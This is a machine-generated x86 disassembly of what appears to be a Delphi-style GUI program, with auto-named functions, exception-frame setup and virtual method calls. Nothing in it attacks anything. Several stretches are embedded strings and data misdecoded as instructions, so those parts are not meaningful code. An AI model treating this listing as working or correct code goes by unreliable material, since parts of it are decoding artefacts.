mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
sbb [ edx + eax * 2 ] bl
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
dec esp
sbb eax 0x1c000045
inc edx
add [ eax + 0x7c0044e7 ] bh
push cs
inc ebx
add [ eax + ebp * 8 + 0x44 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
nop
dec esp
add [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x1
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x1fffbb4b ] al
xor al 0x40
adc [ eax ] al
xchg [ eax ] al
add bh bh
mov al 0xc4
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_4301f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_43026f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_43028c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419304
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4302c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_40436c
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4193a8
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_404100
pop esi
pop ebx
retn
sub_430328
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4304c0
push eax
mov edx esi
mov eax ebx
call sub_4304c0
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_430364
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_419720
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_419720
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_43042c
sub_430394
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_4080b0
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_408078
jmp r-xdata
pop ebx
retn
sub_4303d0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4304c0
mov ebp eax
mov edx edi
mov eax ebx
call sub_4304c0
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_4304c0
call sub_419390
mov esi eax
mov edx edi
mov eax ebx
call sub_4304c0
call sub_419390
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43042c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4303d0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43042c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4304f8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419a68
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_430540
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45bfa0
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_45c258
mov dl 0x1
mov eax esi
call sub_430730
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_430598
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_4306b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_403460
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4189b0
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4189b0
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403460
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4189b0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_4306c0
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_4306fc
push ebx
mov ebx eax
mov eax ebx
call sub_4217c0
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_430730
pop ebx
retn
mov edx eax
mov eax ebx
call sub_430830
sub_430730
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43089c
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_4307fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4189b0
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4189b0
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_430830
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_43089c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_4308fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_43094c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_430a1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a22
lea eax [ ebp - 0x18 ]
call sub_4040ac
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_430a2c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x28c ]
call sub_43e930
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_438a20
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_4384c0
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_438678
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_438570
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ esp ]
call sub_419390
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4189b0
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_419390
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_439378
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4189b0
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_430bc0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4199fc
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403460
mov esi eax
mov eax ebx
call sub_419390
mov edx eax
mov eax [ esi + 0x28c ]
call sub_4304c0
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_419390
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_438aac
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_4384c0
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_438678
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_438570
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_4189b0
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_430cdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_430540
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4304f8
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_430d3c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45bff4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_430d78
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_419720
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_4304c0
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_430de4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_4304c0
mov edx [ eax + 0x10 ]
mov eax edi
call sub_404100
pop edi
pop esi
pop ebx
retn
sub_430e18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_4304c0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_430e50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_430e7c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421c34
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_430f30
sub_430ec0
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_430f30
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_430f30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_431073
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43107a
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403460
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_4304c0
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_4304c0
mov ecx eax
mov edx ebx
mov eax edi
call sub_430d78
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4308fc
test al al
je r-xdata
sub_431088
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4310a7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4310ae
retn
sub_4310b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4310ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431111
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431118
retn
sub_431124
sub [ ecx ] dl
inc ebx
add [ ebx ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
jae r-xdata
outsd
insd
inc esp
jb r-xdata
dec ecx
jb r-xdata
or esp [ ebx + 0x64 ]
jae r-xdata
ja r-xdata
ja r-xdata
jb r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + 0x64 ] esp
jae r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
adc [ ecx ] 0x43
je r-xdata
mov eax eax
mov al 0x12
inc ebx
add [ eax ] al
inc ebx
outsd
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
add dl ah
adc al [ ebx ]
sub [ eax ] al
add [ eax ] al
jo r-xdata
outsd
insd
inc esp
jb r-xdata
or esp [ fs : ebx + 0x64 ]
jae r-xdata
push ebx
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc ebx
add [ edx ] cl
arpl [ eax + edx * 2 + 0x72 ] sp
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630b
outsd
jae r-xdata
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x63 ] dh
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
insb
jae r-xdata
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
add al bh
insb
jae r-xdata
lea eax [ eax ]
clc
adc al [ ebx ]
pop es
push cs
push esp
dec eax
popad
jb r-xdata
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
ja r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
or ah [ ebx + 0x64 ]
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630a
jb r-xdata
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
outsb
je r-xdata
shl [ eax + 0x4312 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ edx ] 0x1
inc ebx
add [ ebx ] cl
arpl [ ebx + esi * 2 + 0x53 ] sp
or [ edx ] dl
inc ebx
add [ esi ] al
add [ eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov al 0x12
inc ebx
add ah bh
arpl [ ecx ] ax
or eax [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
adc al [ ebx ]
clc
je r-xdata
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
popa
jne r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
adc [ eax ] al
push ds
